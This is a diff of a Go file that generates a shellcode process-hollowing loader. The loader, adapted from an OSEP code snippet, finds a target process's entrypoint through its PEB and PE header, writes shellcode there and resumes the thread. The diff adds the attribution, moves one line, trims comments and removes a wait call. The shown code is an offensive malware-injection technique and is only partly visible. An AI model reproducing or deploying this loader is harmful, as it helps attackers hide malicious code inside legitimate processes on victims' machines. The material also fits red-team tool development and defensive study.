@@ -7,6 +7,9 @@ import (
 /*
    For more information, feel free to read this:
    https://www.blackhat.com/docs/asia-17/materials/asia-17-KA-What-Malware-Authors-Don't-Want-You-To-Know-Evasive-Hollow-Process-Injection-wp.pdf
+
+   Adapted from
+   https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Shellcode%20Process%20Hollowing/Program.cs
 */
 
 func GetProcessHollowingTemplate(targetProcess string) string {
@@ -114,7 +117,7 @@ func ExecuteOrderSixtySix(shellcode []byte) {
     // 2. Read the field 'e_lfanew', 4 bytes at offset 0x3C from executable address to get the offset for the PE header
     // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
     // 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address
-    // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
+    // 5. Get the absolute address of the entrypoint by adding this value to the base executable address.
 
 
     // 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing
@@ -150,12 +153,12 @@ func ExecuteOrderSixtySix(shellcode []byte) {
 
     // 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset
 	rvaOffset := lfanew + 0x28
-    rvaOffsetPos := peBuffer[rvaOffset : rvaOffset + 0x4]
 
     // 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address
+    rvaOffsetPos := peBuffer[rvaOffset : rvaOffset + 0x4]
     rva := binary.LittleEndian.Uint32(rvaOffsetPos)
 
-    // 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!
+    // 5. Get the absolute address of the entrypoint by adding this value to the base executable address.
     entrypointAddress := exeBaseAddr + uint64(rva)
 
 
@@ -174,12 +177,6 @@ func ExecuteOrderSixtySix(shellcode []byte) {
 	r, _, err = resumeThread.Call(uintptr(processInfo.Thread)); if r == 0 {
         panic(err)
     }
-
-
-    WaitForSingleObject.Call(
-        uintptr(processInfo.Thread),
-        0xFFFFFFFF,
-    )
 }
     `, targetProcess)
 }
